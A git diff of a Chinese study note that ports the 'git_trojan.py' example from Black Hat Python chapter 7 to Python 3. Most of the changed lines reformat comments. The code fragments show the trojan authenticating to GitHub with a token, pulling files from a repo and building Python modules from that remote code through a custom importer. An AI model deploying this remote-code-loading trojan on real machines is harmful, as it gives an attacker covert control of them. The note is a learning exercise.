@@ -1,16 +1,16 @@
 #### git_trojan.py
 
-###### 最近在学习python黑帽子-黑客与渗透测试变成之道chapter7,如果你也遇到了问题可以参考我的代码。
+最近在学习python黑帽子-黑客与渗透测试变成之道chapter7,如果你也遇到了问题可以参考我的代码。
 
-###### 问题1.这本书用Python2写的，我们现在用的都是python3，不改相应代码，调不通。
+问题1.这本书用Python2写的，我们现在用的都是python3，不改相应代码，调不通。
 
-###### 问题2.有些代码不能用了，比如tree =branch.commit.commit.tree.recurse()要重新修改。
+问题2.有些代码不能用了，比如tree =branch.commit.commit.tree.recurse()要重新修改。
 
-###### 问题3.使用github3.py跟github交互的时候无法获取repo，branch。
+问题3.使用github3.py跟github交互的时候无法获取repo，branch。
 
-###### 问题4.imp模块，系统会提示imp模块已弃用，推荐使用importlib，虽然能用，但是强迫症看着很难受。
+问题4.imp模块，系统会提示imp模块已弃用，推荐使用importlib，虽然能用，但是强迫症看着很难受。
 
-###### 所有问题都在代码中解决，希望对坚持学习的你有一定的帮助。
+所有问题都在代码中解决，希望对坚持学习的你有一定的帮助。
 
 ```python
 # 注意导入模块，我没有导入imp模块，也没有导入importlib模块，原先的import imp模块换成了import types
@@ -34,7 +34,12 @@ trojan_modules = []
 configured = False
 task_queue = queue.Queue()
 token = 'xxxxxxxxxxxxxxxxxxxxxxxxxx'
-# token 是我在自己的github账号上生成的令牌，很简单，研究下生成一个就行，用令牌登录是因为不知道为什么使用账号、密码跟github交互的时候进不去，所以用的令牌，如果你知道为什么的话可以留言告诉我，谢谢。
+"""
+token 是我在自己的github账号上生成的令牌，很简单，研究下生成一个就行，用令牌登录
+是因为不知道为什么使用账号、密码跟github交互的时候进不去，所以用的令牌，如果你知道为什么的话可以留言告诉我，谢谢。
+
+"""
+
 
 
 # 跟github交互得到repo，branch
@@ -59,7 +64,13 @@ def get_file_contents(filepath):
     for filename in tree.tree:
         if filepath in filename.path:
             print("[*] Found file %s" % filepath) 
-            # 原代码是用blob = repo.blob(filename._json_data['sha'])，根据上面h.path,h.sha解释,我试着用filename.sha代替filename._json_data['sha']是可行的，毕竟太长记不住。
+            """
+            原代码是用blob = repo.blob(filename._json_data['sha'])，根据上
+            面h.path,h.sha解释,我试着用filename.sha代替
+            filename._json_data['sha']是可行的，毕竟太长记不住。
+            
+            """
+            
             # blob = repo.blob(filename._json_data['sha']) 原代码
             blob = repo.blob(filename.sha)
             # blob.decoded 是用base64解密后的文件内容           
@@ -113,7 +124,14 @@ class GitImporter(object):
         return None
 
     def load_module(self, name):
-        # imp.new_module(name)返回一个名为name的新的空模块对象。该对象未被插入sys.modules，原代码就是这一句，我花费好长时间查看importlib文档结果没找到解决方法，查了imp.new_module才知道就是用types.ModuleType模块类型，imp.new_module(name)就是返回return types.ModuleType(name)，这里就直接module=types.ModuleType(name)
+        """
+        imp.new_module(name)返回一个名为name的新的空模块对象。该对象未被插入
+        sys.modules，原代码就是这一句，我花费好长时间查看importlib文档结果没找到
+        解决方法，查了imp.new_module才知道就是用types.ModuleType模块类型，
+        imp.new_module(name)就是返回return types.ModuleType(name)，这里就
+        直接module=types.ModuleType(name)
+        """
+       
         # module = imp.new_module(name) 
         module = types.ModuleType(name) 
         # 加载模块内容
